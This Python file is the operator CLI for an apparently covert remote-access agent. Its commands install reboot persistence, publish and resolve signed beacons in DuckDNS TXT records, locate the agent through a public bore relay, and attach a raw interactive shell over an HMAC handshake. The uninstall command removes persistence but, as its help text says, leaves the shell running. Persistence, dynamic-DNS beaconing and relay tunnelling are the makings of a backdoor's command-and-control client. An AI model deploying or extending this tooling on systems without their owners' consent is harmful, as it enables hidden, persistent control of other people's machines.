#!/usr/bin/env python3
"""Operator CLI.

    python3 qu_cli.py status          # is the agent up? where is it published?
    python3 qu_cli.py install         # register reboot persistence + start
    python3 qu_cli.py uninstall       # remove persistence (leaves shell alive)
    python3 qu_cli.py addr            # print the expected duckdns label / port
    python3 qu_cli.py beacon          # publish the beacon now and print it
    python3 qu_cli.py resolve         # read the beacon back from DNS
    python3 qu_cli.py shell [host] [port]   # interactive HMAC-authenticated shell

The `shell` command is what you run from anywhere:

    python3 qu_cli.py shell            # uses the token-derived address
"""

import os
import socket
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import qu_core
import qu_persist
import qu_tunnel
import qu_bore


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

def _tokline():
    return "label=%s port=%d" % (qu_core.subdomain(), qu_core.public_port())


def cmd_status():
    up = qu_persist.is_running()
    print("agent_running : %s" % ("yes" if up else "no"))
    print("identity      : %s" % _tokline())
    print("shell_listener: 127.0.0.1:%d" % qu_core.shell_port())
    print("bore_relay    : %s" % qu_core.BORE_SERVER)
    print("duckdns       : %s" % ("enabled" if qu_core.DUCKDNS_TOKEN else "disabled"))
    if qu_core.DUCKDNS_TOKEN:
        names = qu_tunnel._duck_names()
        print("duckdns_names : %s" % (", ".join(names) if names else "(none configured)"))
    log = qu_core.state_file("agent.log")
    if os.path.isfile(log):
        try:
            with open(log, "r") as fh:
                tail = fh.readlines()[-8:]
            print("--- recent log ---")
            for line in tail:
                sys.stdout.write(line)
        except Exception:
            pass


def cmd_addr():
    print("duckdns_label : %s.duckdns.org" % qu_core.subdomain())
    print("relay_port    : %d" % qu_core.public_port())
    print("fallback      : %s" % qu_core.BORE_SERVER)


def cmd_install():
    ok = qu_persist.install()
    print("persistence   : %s" % ("installed" if ok else "degraded"))
    print("agent_running : %s" % ("yes" if qu_persist.is_running() else "no"))


def cmd_beacon():
    port = qu_core.public_port()
    payload = qu_tunnel.beacon(qu_core.BORE_SERVER, port)
    print("payload       : %s" % payload)
    print("published     : %s" % ("yes" if qu_tunnel.duckdns_publish(payload) else "no"))
    if qu_core.DUCKDNS_TOKEN:
        for name in qu_tunnel._duck_names():
            print("lookup        : dig +short TXT %s.duckdns.org" % name)


def cmd_resolve():
    names = qu_tunnel._duck_names() or [qu_core.subdomain()]
    found = None
    for name in names:
        fqdn = "%s.duckdns.org" % name
        print("querying      : %s" % fqdn)
        for line in qu_tunnel.txt_lookup(fqdn):
            line = line.strip()
            if line.startswith(qu_tunnel.BEACON_VERSION + "|"):
                found = line
                break
        if found:
            break
    if not found:
        print("beacon        : not found")
        return
    print("beacon        : %s" % found)
    verified = qu_tunnel.beacon_verify(found)
    if not verified:
        print("signature     : INVALID")
        return
    server, port = verified
    print("signature     : ok")
    print("connect       : %s %s:%d" % ("python3 qu_cli.py shell", server, port))


def cmd_shell(argv):
    host = argv[0] if argv else qu_core.BORE_SERVER
    port = None

    if len(argv) >= 2:
        port = int(argv[1])
    else:
        # No port given: ask the agent's own derived address first, then scan
        # forward for a temporary collision, then try the DuckDNS label.
        want = qu_core.public_port()
        sys.stdout.write("discovering %s ...\n" % host)
        sys.stdout.flush()
        found, nonce = qu_bore.discover(host, want)
        if found:
            port = found
            sys.stdout.write("found agent on port %d\n" % port)
        elif qu_core.DUCKDNS_TOKEN:
            beacon = _resolve_beacon()
            verified = qu_tunnel.beacon_verify(beacon) if beacon else None
            if verified:
                host, port = verified
                sys.stdout.write("beacon -> %s:%d\n" % (host, port))

    if not port:
        sys.stdout.write("no agent found (pass host and port explicitly)\n")
        return 2
    return _interactive(host, port)


def _resolve_beacon():
    names = qu_tunnel._duck_names() or [qu_core.subdomain()]
    for name in names:
        for line in qu_tunnel.txt_lookup("%s.duckdns.org" % name):
            line = line.strip()
            if line.startswith(qu_tunnel.BEACON_VERSION + "|"):
                return line
    return None


# --------------------------------------------------------------------------
# interactive client
# --------------------------------------------------------------------------

def _interactive(host, port):
    sys.stdout.write("connecting %s:%d ...\n" % (host, port))
    sys.stdout.flush()
    try:
        sock = socket.create_connection((host, port), timeout=20)
    except Exception as exc:
        sys.stdout.write("connect failed: %s\n" % exc)
        return 2
    sock.settimeout(None)

    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass

    # handshake
    line = _readline(sock)
    if not line or not line.startswith("QU1 "):
        sys.stdout.write("handshake failed: %r\n" % line)
        return 3
    nonce = line[4:].strip()
    sock.sendall(("HMAC %s\n" % qu_core.sign(nonce)).encode())
    answer = _readline(sock)
    if not answer or not answer.startswith("OK"):
        sys.stdout.write("auth rejected: %r\n" % answer)
        return 4
    sys.stdout.write("%s\n" % answer[3:].strip())

    _attach(sock)
    return 0


def _readline(sock):
    out = b""
    while len(out) < 1024:
        ch = sock.recv(1)
        if not ch:
            return None
        if ch == b"\n":
            return out.decode("utf-8", "replace")
        out += ch
    return out.decode("utf-8", "replace")


def _attach(sock):
    import threading
    try:
        import termios
        import tty
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        tty.setraw(fd)
    except Exception:
        old = None

    def pump():
        try:
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                sys.stdout.write(data.decode("utf-8", "replace"))
                sys.stdout.flush()
        except Exception:
            pass
        finally:
            try:
                sys.stdout.flush()
            except Exception:
                pass
            os._exit(0)

    t = threading.Thread(target=pump)
    t.daemon = True
    t.start()

    try:
        while True:
            data = sys.stdin.buffer.read(1)
            if not data:
                break
            sock.sendall(data)
    except (KeyboardInterrupt, Exception):
        pass
    finally:
        if old is not None:
            try:
                import termios
                termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, old)
            except Exception:
                pass
        try:
            sock.close()
        except Exception:
            pass


# --------------------------------------------------------------------------

def main(argv):
    cmd = (argv[1] if len(argv) > 1 else "status").lower()
    rest = argv[2:]
    if cmd == "status":
        cmd_status()
    elif cmd == "install":
        cmd_install()
    elif cmd == "uninstall":
        qu_persist.uninstall()
        print("persistence   : removed")
    elif cmd == "addr":
        cmd_addr()
    elif cmd == "beacon":
        cmd_beacon()
    elif cmd == "resolve":
        cmd_resolve()
    elif cmd == "shell":
        return cmd_shell(rest)
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
